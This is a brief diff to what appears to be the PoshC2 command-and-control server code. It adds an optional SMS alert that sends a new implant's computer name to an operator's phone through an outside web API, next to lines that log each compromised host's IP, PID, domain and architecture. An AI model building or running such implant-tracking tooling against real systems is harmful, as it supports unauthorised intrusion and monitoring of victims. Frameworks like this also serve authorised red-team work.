@@ -1515,6 +1515,13 @@ $message =[Convert]::ToBase64String($Bytes)
         Write-Host "New host connected: (uri=$randomuri, key=$key)" -ForegroundColor Green
         Write-Host "$endpointip | PID:$im_pid | Sleep:$defaultbeacon | $im_computername $im_domain ($im_arch) "`n -ForegroundColor Green
 
+        # optional clockwork sms on new implant
+        $mobilenumber = ""
+        $apikey = ""
+        if (($apikey) -and ($mobilenumber)){
+            (New-Object System.Net.Webclient).DownloadString("https://api.clockworksms.com/http/send.aspx?key=$apikey&to=$mobilenumber&from=PoshC2&content=$im_computername")|Out-Null
+        }
+
         if ($enablesound -eq "Yes") {
             try {
             $voice = New-Object -com SAPI.SpVoice                        
